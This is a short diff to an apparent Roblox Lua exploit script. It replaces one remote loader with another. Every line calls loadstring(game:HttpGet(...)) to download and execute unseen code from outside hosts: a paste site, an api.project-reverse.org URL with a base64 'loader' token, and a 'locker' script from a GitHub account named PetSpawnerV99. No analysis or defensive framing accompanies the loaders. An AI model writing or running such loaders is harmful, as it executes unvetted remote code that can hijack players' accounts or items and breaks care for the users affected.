@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://pastefy.app/4WukVAhV/raw", true))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU3NjU4MzI4LTY0NTgtNDg3OC05NWYxLWVhNDQ2OGY2MmI0NyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSpawnerV99/guikiller/refs/heads/main/locker"))()
